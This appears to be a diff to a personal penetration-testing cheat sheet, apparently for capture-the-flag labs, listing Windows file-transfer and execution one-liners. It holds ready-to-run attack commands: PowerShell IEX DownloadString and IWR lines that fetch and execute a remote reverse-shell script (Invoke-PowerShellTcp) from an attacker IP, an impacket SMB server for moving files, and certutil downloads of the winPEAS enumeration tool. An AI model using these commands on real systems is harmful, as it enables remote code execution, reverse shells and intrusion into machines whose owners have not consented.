@@ -36,7 +36,22 @@ $cred = new-object -typename System.Management.Automation.PSCredential -argument
 Invoke-Command -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28/Invoke-PowerShellTcp2.ps1');} -Credential $cred -Computer localhost
 
 ==============================================================================
-[+] Transfer files
+[+] Transfer files SMB
 ==============================================================================
 sudo impacket-smbserver smbFolder $(pwd) -smb2support
 \\10.10.14.20\smbFolder\test.bat test.bat
+
+==============================================================================
+[+] Transfer files WEB Powershell
+==============================================================================
+powershell.exe  IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28/Invoke-PowerShellTcp2.ps1');
+powershell.exe  IEX (IWR http://10.10.14.28/-PowerShellTcp.ps1 -UseBasicParsing)
+==============================================================================
+[+] Transfer files Certutil
+==============================================================================
+# Powershell
+cmd /c certutil.exe -urlcache -split -f http://10.10.14.28/winPEAS.exe
+
+# CMD
+certutil.exe -urlcache -split -f http://10.10.14.28/winPEAS.exe
+certutil -urlcache -split -f http://10.10.14.28/winPEAS.exe
